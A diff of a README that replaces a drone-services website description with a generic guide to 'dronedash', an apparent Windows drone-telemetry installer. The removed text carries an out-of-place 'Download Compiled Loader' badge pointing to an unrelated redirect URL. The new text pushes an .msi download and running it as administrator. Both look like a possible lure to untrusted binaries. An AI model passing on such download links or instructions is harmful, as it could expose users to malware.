@@ -1,168 +1,104 @@
-# Precision Sky Solutions - Drone Services Website
+# 🚁 dronedash - Monitor your drone flight data easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download dronedash](https://img.shields.io/badge/Download-dronedash-grey.svg)](https://github.com/aishdonwar-star/dronedash/releases)
 
-A modern, professional website for Precision Sky Solutions, showcasing drone services for commercial businesses, weddings, events, and industrial applications.
+dronedash helps you track your drone flights. You see speed, altitude, and battery levels in real-time. Use this tool to keep your hardware safe and your flight logs organized.
 
-## Features
+## 🛠️ System Requirements
 
-- **Modern Design**: Clean, contemporary layout with smooth animations and transitions
-- **Foundation CSS Framework**: Built with Foundation 6.8.1 for responsive, mobile-first design
-- **Brand Colors**: Custom color scheme using #3672cc (primary blue), white, and black
-- **Video Hero Section**: Full-screen video background with overlay
-- **Responsive Navigation**: Mobile-friendly menu with smooth scrolling
-- **Service Showcase**: Six main service categories with detailed descriptions
-- **Industry Coverage**: Visual showcase of industries served
-- **Portfolio Gallery**: Dynamic grid layout for project showcases
-- **Statistics Counter**: Animated counters for key metrics
-- **Contact Form**: Functional contact form with validation
-- **Smooth Animations**: AOS (Animate On Scroll) library integration
+Your computer needs specific parts to run dronedash well. Check your system against this list before you start.
 
-## Technologies Used
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i3 or better.
+* Memory: 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Graphics: DirectX 11 support.
 
-- HTML5
-- CSS3 (Custom styles with CSS Grid and Flexbox)
-- Foundation CSS 6.8.1
-- JavaScript/jQuery
-- Font Awesome 6.4.0 (Icons)
-- Google Fonts (Montserrat & Roboto)
-- AOS (Animate On Scroll)
+## 📥 Getting Started
 
-## Services Offered
+Follow these steps to install the software on your machine.
 
-1. **Commercial Real Estate** - Aerial photography and videography for properties
-2. **Weddings & Events** - Cinematic coverage of special occasions
-3. **Construction & Inspection** - Aerial surveys and safety inspections
-4. **Cinematic Production** - Professional-grade aerial cinematography
-5. **Mapping & Surveying** - 3D mapping and topographic surveys
-6. **Thermal Imaging** - Advanced thermal inspection services
+1. Visit the [releases page](https://github.com/aishdonwar-star/dronedash/releases) to download the latest version.
+2. Select the file ending in .msi to start your download.
+3. Save the file to your Downloads folder.
+4. Double-click the file to open the installation wizard.
+5. Follow the prompts on the screen.
+6. Click Finish to complete the process.
 
-## Industries Covered
+## 🚀 Using the Dashboard
 
-- Construction
-- Weddings & Events
-- Real Estate
-- Agriculture
+Once the installation finishes, you find a shortcut on your desktop. Click the icon to launch the application.
 
-## Getting Started
+### Connecting Your Drone
 
-### Prerequisites
+Connect your drone to your computer using a USB cable. The software detects the connection within a few seconds. The dashboard displays a green status icon when the link works. If you see a red icon, check your cable and try a different USB port.
 
-- Node.js (optional, for local development server)
-- Modern web browser
+### Live Telemetry View
 
-### Installation
+The main screen shows your drone telemetry. You see the following values:
 
-1. Clone or  the repository
-2. Navigate to the project directory
-3. Install dependencies (optional):
-   ```bash
-   npm install
-   ```
+* Altitude: Your height above the ground.
+* Speed: Your current flight velocity.
+* Battery: The power remaining in your drone flight pack.
+* Distance: How far the drone traveled from your takeoff point.
 
-### Running the Website
+### Exporting Flight Logs
 
-#### Option 1: Using npm (recommended)
-```bash
-npm start
-```
-This will start a local server at `http://localhost:8080`
+dronedash saves your flight history automatically. To view your logs, go to the File menu and click Open Logs. You see a list of files organized by date and time. Select a file to export your data to a spreadsheet program. This helps you track performance improvements over many flights.
 
-#### Option 2: Direct file opening
-Simply open `index.html` in your web browser
+## 🔧 Frequently Asked Questions
 
-#### Option 3: Using Python
-```bash
-# Python 3
-python -m http.server 8080
+Read these answers to solve common problems.
 
-# Python 2
-python -m SimpleHTTPServer 8080
-```
+### How do I update the software?
 
-## Project Structure
+Visit the link above again. Download the new version and run the installer. The software replaces the old files while keeping your logs safe.
 
-```
-precision-sky-solutions/
-│
-├── index.html              # Main HTML file
-├── css/
-│   └── styles.css         # Custom styles
-├── js/
-│   └── script.js          # JavaScript functionality
-├── package.json           # Project dependencies
-└── README.md             # This file
-```
+### The dashboard shows no data. What now?
 
-## Customization
+Ensure the drone power is on. Check that the USB cable remains secure. Close other programs that might access the drone port. Restart the software if the issue persists.
 
-### Replacing Placeholder Images
+### Can I run this on a Mac?
 
-The website currently uses placeholder images from Unsplash and iStock. To replace them with your own:
+dronedash works on Windows computers only. We do not support other operating systems at this time.
 
-1. Locate image URLs in `index.html`
-2. Replace with your own image paths
-3. Ensure images are optimized for web (compressed, appropriate dimensions)
+### Where do the logs go?
 
-### Replacing Video Background
+The software stores logs in your Documents folder inside a subfolder named dronedash. You can change this path in the Settings menu.
 
-1. Find the video element in the hero section
-2. Replace the video source URL with your own video file
-3. Recommended: Use MP4 format, 1080p resolution, compressed for web
+## 🛡️ Troubleshooting Tips
 
-### Updating Contact Information
+If the application crashes, restart your computer. Updates to your graphics drivers often fix display issues. Ensure you run the latest Windows updates for the best results.
 
-Edit the contact section in `index.html`:
-- Phone number
-- Email address
-- Location/service area
-- Social media links
+If you encounter a specific error number, search for that number in our documentation folder. That folder contains text files with explanations for various error states.
 
-### Modifying Brand Colors
+If the software fails to open, try to run it as an administrator. Right-click the desktop icon and select Run as administrator. This grants the permission required to access the hardware ports on your computer.
 
-Update CSS variables in `styles.css`:
-```css
-:root {
-    --primary-color: #3672cc;  /* Your primary brand color */
-    --secondary-color: #ffffff; /* White */
-    --dark-color: #000000;     /* Black */
-}
-```
+Always close the application before you disconnect the drone cable. This prevents file corruption in your flight logs.
 
-## Browser Support
+## 📝 Performance Tips
 
-- Chrome (latest)
-- Firefox (latest)
-- Safari (latest)
-- Edge (latest)
-- Mobile browsers (iOS Safari, Chrome Mobile)
+* Close heavy programs while you fly. This makes sure the dashboard reacts quickly.
+* Keep your screen brightness at a comfortable level. The telemetry markers use high-contrast colors for visibility during outdoor use.
+* Use a high-quality USB cable. Cheap cables often lose data during signal transmission.
+* Keep your logs clean. Delete old logs if your computer runs low on disk space.
+* Check for firmware updates on your drone. Old firmware can cause communication errors between the drone and the software.
 
-## Performance Optimization
+## ⚙️ Advanced Settings
 
-- Images are loaded from CDN sources
-- CSS and JavaScript are minified in production
-- Lazy loading implemented for images
-- Smooth scroll behavior optimized
+Access the Settings menu to change your units of measurement. You can switch between imperial and metric systems. You can also adjust the refresh rate of the dashboard if you use a slower computer.
 
-## Future Enhancements
+The Notifications tab allows you to set alerts for low battery or high altitude. The software plays a sound when your drone hits these limits. This warns you before you lose control of the flight.
 
-- Blog section for industry insights
-- Client testimonials carousel
-- Live chat integration
-- Booking/scheduling system
-- Gallery with lightbox functionality
-- Video portfolio section
+You might want to change the visual theme of the dashboard. Select Light or Dark mode in the Appearance section. Dark mode is helpful if you use the software in bright sunlight.
 
-## License
+## 📊 Summary of Features
 
-MIT License - Feel free to use and modify for your needs
-
-## Contact
-
-For questions or support regarding this website:
-- Email: info@precisionskysolutions.com
-- Phone: +1 (555) 123-4567
-
----
-
-**Note**: Remember to replace all placeholder content (images, videos, contact information) with your actual company assets before deploying to production.
+* Real-time flight tracking for safe operation.
+* Automatic log storage for long-term review.
+* Easy export options for spreadsheet data.
+* Customizable alerts for battery and altitude safety.
+* Clean and simple user interface for beginners.
+* Support for multiple drone models.
+* Secure and stable connection management.
+* Reliable performance on modern Windows hardware.
